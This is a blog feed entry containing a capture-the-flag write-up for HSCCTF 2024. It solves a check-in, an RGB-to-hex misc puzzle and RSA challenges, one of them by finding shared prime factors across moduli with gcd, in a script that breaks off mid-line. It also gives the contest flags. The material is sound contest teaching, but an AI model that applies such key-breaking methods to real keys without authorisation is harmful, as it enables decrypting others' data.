<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2024-03-14T12:47:15.999Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HSCCTF 2024</title>
    <link href="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/"/>
    <id>https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/</id>
    <published>2024-03-11T03:28:02.000Z</published>
    <updated>2024-03-14T12:47:15.999Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。</p><p><strong>Rank: 1</strong></p><hr><p>​    </p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><h3 id="CHECKIN-1"><a href="#CHECKIN-1" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><p>关注公众号：#红客突击队/#中龙红客突击队，并发送hscctf2024以获取flag</p></blockquote><p>分别给两个公众号发hscctf2024，得到字符串拼接：<code>hscctf&#123;hscctf2O24_w3lc0me&#125;</code>。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="катюша"><a href="#катюша" class="headerlink" title="катюша"></a>катюша</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}</p></blockquote><p>查看源码，提取rgb值拼接：</p><p><code>4, 8, 5, 3, 4, 3, 4, 3, 5, 4, 4, 6, 7, 11, 5, 9, 6, 15, 7, 5, 5, 15, 6, 8, 6, 1, 7, 6, 6, 5, 5, 15, 7, 2, 6, 5, 6, 3, 6, 5, 6, 9, 7, 6, 6, 5, 6, 4, 5, 15, 7, 4, 6, 8, 6, 5, 5, 15, 6, 12, 6, 5, 7, 4, 7, 4, 6, 5, 7, 2, 5, 15, 6, 15, 6, 6, 5, 15, 4, 11, 6, 1, 7, 1, 6, 9, 7, 5, 7, 3, 6, 8, 6, 1, 7, 13</code></p><p>转换为16进制：</p><p><code>4853434354467b596f755f686176655f72656365697665645f7468655f6c65747465725f6f665f4b617169757368617d</code></p><p>转为字符串：<code>HSCCTF&#123;You_have_received_the_letter_of_Kaqiusha&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h3><blockquote><p>出题人很幽默,给你p和q了直接解吧</p></blockquote><p>直接运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">1627858721743596752497831640628357323459243890844363792736407789751577427319257708507686114456632938183775129585728892845205290864750578798354859933996208521450129131173352490118085939969385911306718129785035108056909135931322755908602656567223998858450130768625587559935064753603718657989533793373124922891077849376447589198239126291127263234784363556777780461489387706699053671315621968807065360907667815336609878856798387057891974730460404647229308105442629038061284060276648993434681114539955086828451085582033288860959729755856478065093327544217813990665326820156340461326538271909605715822484950196033809892232121330623027855970475888202583512234213349462680452400729903400494519431590431864717223438807093669836615356855072370571595889807712166659061190031457954071146645411277702230847389264989391715763232453605404095019402186331633202953693057641475300619482863265936513394341066776619336452923951439714749067348507</span></span><br><span class="line">q = <span class="number">165059760196977338034268528857897083190717585647808271832795575354736221674892279730906525407442580833042731114617534865267230347093979480666213073939602212663043286794259410177026619955285626139270678815060566416554620185859901611571955490060241822054715533030464833509114500388615748465579240918292431860839</span></span><br><span class="line">c = <span class="number">209347444484196477254668267578954904181293909211985372842733666165076889646025992007884927283300662833989678431462547742385291078285045060028956748455410812196305788814280968487973559115983082461315009316488143477261307107939530267533197821947240438534411830018967506368459544025037634267899970815198992392565948727381322854560823769432552779881938316107779842525092269591932257206582810678457433166038809740255591841951300818106018061065936083887559841543250701094558114335651396741896281230175124133873529005816838785880680073159461666783649744640398010841282229366323100807220116460976549981263966530038289223576133865992894885483308732021144420507955669760623032114718333853671281281221009397028372653797668774820725717817362383394165014402977767667433542733963298092312930702496796235196487999167666133884266829605503363510544384236303968829214389757297563873395131798724306227675722494797069994655456021649231626359765579028950908065367760981736933167557841586896807116262630848742514005606289980676609588756946993271763119859088002784499062149533167332388600036550273743940503131248513795389688869470432261503038708892320267815658450917855334244502333938120781251564676408212996623419957317150267768978807968208353379334556945</span></span><br><span class="line"></span><br><span class="line">d = inverse(<span class="number">65537</span>, q - <span class="number">1</span>)</span><br><span class="line">m = powmod(c, d, q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;xin_nian_hao_ya&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="REAL-SIGN-IN"><a href="#REAL-SIGN-IN" class="headerlink" title="REAL_SIGN_IN"></a>REAL_SIGN_IN</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*************************&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    c = powmod(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n&quot;</span>, i, <span class="string">&quot;=&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>, i, <span class="string">&quot;=&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line"><span class="string">c1 = 10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line"><span class="string">n2 = 13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line"><span class="string">c2 = 3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line"><span class="string">n3 = 20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line"><span class="string">c3 = 11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line"><span class="string">n4 = 19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line"><span class="string">c4 = 12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line"><span class="string">n5 = 15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line"><span class="string">c5 = 1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line"><span class="string">n6 = 22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line"><span class="string">c6 = 16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line"><span class="string">n7 = 20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line"><span class="string">c7 = 19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line"><span class="string">n8 = 28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line"><span class="string">c8 = 1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line"><span class="string">n9 = 10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line"><span class="string">c9 = 7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line"><span class="string">n10 = 16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line"><span class="string">c10 = 6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line"><span class="string">n11 = 26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line"><span class="string">c11 = 20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>爆破找到 $\gcd(n_i,n_j)&gt;1$ 的情形，即为 $\gcd(n_i,n_j)=p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line">c1 = <span class="number">10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line">n2 = <span class="number">13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line">c2 = <span class="number">3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line">n3 = <span class="number">20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line">c3 = <span class="number">11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line">n4 = <span class="number">19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line">c4 = <span class="number">12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line">n5 = <span class="number">15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line">c5 = <span class="number">1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line">n6 = <span class="number">22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line">c6 = <span class="number">16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line">n7 = <span class="number">20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line">c7 = <span class="number">19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line">n8 = <span class="number">28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line">c8 = <span class="number">1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line">n9 = <span class="number">10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line">c9 = <span class="number">7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line">n10 = <span class="number">16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line">c10 = <span class="number">6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line">n11 = <span class="number">26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line">c11 = <span class="number">20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"></span><br><span class="line">n = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">f&#x27;n<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">if</span> 